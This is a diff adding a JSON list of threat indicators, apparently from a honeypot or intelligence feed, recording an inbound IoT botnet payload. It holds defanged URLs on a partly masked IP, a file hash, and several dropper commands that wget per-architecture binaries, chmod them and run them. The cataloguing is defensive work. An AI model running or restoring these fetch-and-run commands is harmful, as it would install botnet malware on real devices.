@@ -1,0 +1,80 @@
+[
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://31.56.209.XXX/arm7;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://31.56.209.XXX/x86;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://31.56.209.XXX/arm5;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://31.56.209.XXX/mpsl;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://31.56.209.XXX/mips;"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "31.56.209.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "rm arm7; wget hxxp://31.56.209.XXX/arm7; chmod 777 arm7;./arm7 telnet;"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "rm arm5; wget hxxp://31.56.209.XXX/arm5; chmod 777 arm5;./arm5 telnet;"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "rm mips; wget hxxp://31.56.209.XXX/mips; chmod 777 mips;./mips telnet;"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "rm mpsl; wget hxxp://31.56.209.XXX/mpsl; chmod 777 mpsl;./mpsl telnet;"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "rm x86; wget hxxp://31.56.209.XXX/x86; chmod 777 x86;./x86 telnet;HTTP/1.1 200 OK"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "rm x86; wget hxxp://31.56.209.XXX/x86; chmod 777 x86;./x86 telnet;"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "07e121e2b542e5b596837d85d936bb31a8a9f09df2a3fb10ebe3bd23bf5bc6c1"
+  }
+]
